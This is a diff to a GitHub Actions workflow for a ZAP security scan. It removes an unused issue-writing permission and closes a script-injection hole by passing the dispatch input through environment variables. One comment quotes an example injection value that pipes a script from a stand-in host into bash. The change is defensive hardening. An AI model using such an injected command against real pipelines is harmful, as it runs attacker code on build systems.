@@ -35,7 +35,10 @@ on:
 permissions:
   contents: read
   security-events: write
-  issues: write   # so ZAP can open findings issues if enabled
+  # [2026-07-05 review fix] Removed issues: write -- the ZAP step below sets
+  # allow_issue_writing: false (see comment there), so this permission was
+  # granted but never exercised. Least-privilege: re-add it in the same
+  # commit that flips allow_issue_writing to true, not preemptively.
 
 jobs:
   zap:
@@ -48,10 +51,20 @@ jobs:
 
       - name: Resolve target
         id: target
+        # [2026-07-05 review fix] github.event.inputs.target_url is free-text
+        # supplied by whoever dispatches this workflow. Interpolating it
+        # directly into a `run:` script (as this used to do) is a script-
+        # injection vector -- GitHub expands `${{ }}` as raw text BEFORE the
+        # shell runs, so a value like `"; curl evil.sh | bash #` would execute.
+        # Routing it through `env:` first means the shell sees it as an
+        # ordinary variable value, not literal script text.
+        env:
+          TARGET_URL_INPUT: ${{ github.event.inputs.target_url }}
+          DAST_TARGET_URL_VAR: ${{ vars.DAST_TARGET_URL }}
         run: |
-          TARGET="${{ github.event.inputs.target_url }}"
+          TARGET="$TARGET_URL_INPUT"
           if [ -z "$TARGET" ]; then
-            TARGET="${{ vars.DAST_TARGET_URL }}"
+            TARGET="$DAST_TARGET_URL_VAR"
           fi
           if [ -z "$TARGET" ]; then
             echo "no-target=true" >> "$GITHUB_OUTPUT"
